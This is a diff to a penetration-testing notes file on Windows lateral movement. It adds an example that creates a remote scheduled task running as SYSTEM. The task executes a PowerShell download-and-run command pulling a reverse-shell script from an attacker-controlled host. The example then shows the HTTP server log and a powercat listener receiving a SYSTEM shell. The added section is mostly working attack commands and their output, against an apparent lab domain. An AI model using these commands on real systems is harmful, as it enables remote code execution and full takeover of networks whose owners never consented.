@@ -4,13 +4,14 @@ Lateral movement with native commands (WMIC, PowerShell Remoting, RDP)
 ========================================================================================================================
 
 Requirement: 
-> You need valid admin credentials on the remote Windows server or worksation
+> You need valid admin credentials on the remote Windows server or workstation
 
 Index
 ======
 1. Powershell Remoting
 2. WMIC
-3. RDP
+3. Create remotely a scheduled task (native command 'schtasks') + Powershell reverse shell (InvokePowerShellTcp.ps1)
+4. RDP
 
 
 ========================================================================================================================
@@ -143,3 +144,50 @@ Administrator
 auditor
 The command completed successfully.
 
+
+========================================================================================================================
+Example 3 - Create remotely a scheduled task (command schtasks) + Powershell reverse shell (InvokePowerShellTcp.ps1)
+========================================================================================================================
+
+C:\AD\jfc-tools\x64>schtasks /create /S win-server01.security-Test-Lab.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "testuser" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://X.X.X.X/InvokePowerShellTcp2.ps1''')'"
+SUCCESS: The scheduled task "testuser" has successfully been created.
+
+C:\AD\jfc-tools\x64>schtasks /Run /S win-server01.security-Test-Lab.local /TN "testuser"
+SUCCESS: Attempted to run the scheduled task "testuser".
+
+
+Other: schtasks /query /S win-server01.security-Test-Lab.local
+
+-----------------------
+
+C:\AD\jfc-tools>python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+172.16.1.1 - - [02/Sep/2020 11:40:37] code 404, message File not found
+172.16.1.1 - - [02/Sep/2020 11:40:37] "GET /InvokePowerShellTcp2.ps1 HTTP/1.1" 404 -
+172.16.1.1 - - [02/Sep/2020 11:41:42] "GET /InvokePowerShellTcp2.ps1 HTTP/1.1" 200 -
+
+-----------------------
+
+C:\Windows\system32>powershell -nop -ep bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> cd C:\AD\jfc-tools\
+PS C:\AD\jfc-tools> . .\powercat.ps1
+PS C:\AD\jfc-tools> .\powercat.ps1 -l -p 443 -v -t 1000
+PS C:\AD\jfc-tools> powercat -l -p 443 -v -t 1000
+VERBOSE: Set Stream 1: TCP
+VERBOSE: Set Stream 2: Console
+VERBOSE: Setting up Stream 1...
+VERBOSE: Listening on [0.0.0.0] (port 443)
+VERBOSE: Connection from [X.X.X.X] port  [tcp] accepted (source port 51843)
+VERBOSE: Setting up Stream 2...
+VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
+Windows PowerShell running as user Win-Server01$ on win-server01
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>hostname
+win-server01
+
+PS C:\Windows\system32> whoami
+nt authority\system
